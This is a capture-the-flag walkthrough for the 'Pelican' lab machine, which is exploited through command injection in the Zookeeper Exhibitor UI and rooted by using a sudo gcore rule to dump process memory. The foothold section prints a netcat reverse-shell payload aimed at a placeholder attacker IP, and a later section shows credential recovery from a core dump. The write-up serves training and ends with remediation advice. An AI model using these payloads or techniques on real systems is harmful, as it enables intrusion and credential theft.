# Pelican — Proving Grounds

| | |
|---|---|
| **Platform** | Proving Grounds (Practice) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Status** | ✅ Practice machine, no overlap with the OSCP exam pool |
| **Key techniques** | Unauthenticated command injection (Zookeeper Exhibitor UI), `sudo gcore` process-memory dump (GTFOBins) |

---

## TL;DR

Pelican exposes the **Exhibitor** UI for Apache Zookeeper, which allows
editing a configuration script that's later executed — an unauthenticated
command injection. Privilege escalation abuses a `sudo` rule allowing
`gcore` (a process memory-dumping tool) with no password: dumping a running
root process's memory and grepping the core file for strings recovers a
plaintext password sitting in that process's memory.

---

## Recon & Enumeration

```bash
sudo nmap -p- -sVC <TARGET_IP>
```

Zookeeper's Exhibitor UI, running on port 2181, was recognized as having a
public documented exploit.

---

## Foothold / Initial Access

Exhibitor exposes a `java.env` configuration script through its UI that,
per public write-ups for this exact service, gets executed by the
underlying process — meaning arbitrary shell content pasted into that
script runs on the server. Injecting a netcat reverse shell one-liner into
the script and saving it triggered execution:

```
$(/bin/nc -e /bin/sh <ATTACKER_IP> 4444 &)
```

```bash
nc -lvnp 4444
```

Shell landed as a low-privilege user. User flag retrieved after upgrading
to a proper TTY.

---

## Privilege Escalation

`sudo -l` showed the user could run **`/usr/bin/gcore`** as any user with no
password — `gcore` dumps a running process's full memory to a core file.
GTFOBins documents this as a privilege escalation primitive: dumping any
process that currently holds sensitive data in memory (a password just
typed, a credential cached by another tool) exposes that data in the
resulting core file.

Looking for a promising root-owned process (`ps -ef | grep root`) turned up
a password-manager-style process. Dumping its memory and searching the
result for readable strings recovered a plaintext root password directly:

```bash
sudo /usr/bin/gcore <PID>
strings core.<PID> | grep -i pass
```

`su root` with the recovered password succeeded. Root flag retrieved.

---

## Lessons Learned

- **A public, documented command-injection path in project-specific
  management UIs (Exhibitor here) is worth checking for by name** —
  Zookeeper's own core protocol wasn't the vulnerability, its bundled admin
  UI was.
- **`sudo` rules granting seemingly "read-only" diagnostic tools (`gcore`,
  and similarly `strings`, `gdb`, `tcpdump`) are still full privilege
  escalation primitives** — GTFOBins should be the first stop for any
  unfamiliar binary in a `sudo -l` listing.
- Process memory is a credential source independent of the filesystem —
  dumping the right process at the right moment can recover secrets never
  written to disk at all.

---

## Remediation

- Restrict or authenticate access to admin/management UIs like Exhibitor;
  never expose configuration-editing features that lead to code execution
  without authentication.
- Remove overly broad `sudo` grants for diagnostic binaries; if `gcore` is
  needed, scope it to a specific non-sensitive process rather than `ALL`.
- Avoid keeping plaintext credentials in a long-lived process's memory
  where possible; use credential managers that clear sensitive memory after
  use.

---

**Machine:** [Proving Grounds — Pelican](https://portal.offsec.com/labs/play)
